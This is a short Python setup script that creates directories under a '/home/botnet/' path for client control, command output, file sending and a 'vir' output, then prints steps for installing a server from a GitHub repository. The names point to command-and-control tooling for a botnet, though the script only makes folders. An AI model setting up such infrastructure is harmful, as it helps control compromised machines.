import os

dirs = [
    "/home/botnet/client/clients",
    "/home/botnet/server/client_control",
    "/home/botnet/server/client_output",
    "/home/botnet/server/custom_cmd/output",
    "/home/botnet/server/online",
    "/home/botnet/server/sendfile/output",
    "/home/botnet/server/vir/output"
]

for x in dirs:
    os.makedirs(x)

print("1. Install interface.py, server_main.py, and server.py for the github at https://github.com/40x50/NETP.")
print("2. Once installed, run the server with \"python3 server_main.py\"")
print("3. You're server is all set!")